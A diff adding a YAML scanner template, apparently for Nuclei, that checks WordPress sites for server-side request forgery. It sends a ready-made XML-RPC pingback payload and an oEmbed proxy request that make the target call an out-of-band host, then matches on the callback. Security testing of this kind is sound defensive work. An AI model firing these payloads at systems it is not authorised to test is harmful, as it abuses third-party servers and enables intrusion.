@@ -1,0 +1,62 @@
+id: wordpress-ssrf
+
+info:
+  name: WordPress Server-Side Request Forgery
+  author: vrtha-framework
+  severity: high
+  description: Tests for SSRF vulnerabilities via XML-RPC pingback and other endpoints
+  reference:
+    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-918
+  metadata:
+    owasp: A10:2021 - Server-Side Request Forgery (SSRF)
+  tags: wordpress,ssrf,xmlrpc,owasp-a10
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/xmlrpc.php"
+    headers:
+      Content-Type: text/xml
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <methodCall>
+        <methodName>pingback.ping</methodName>
+        <params>
+          <param><value><string>http://{{interactsh-url}}</string></value></param>
+          <param><value><string>{{BaseURL}}/</string></value></param>
+        </params>
+      </methodCall>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "methodResponse"
+          - "pingback"
+        condition: or
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
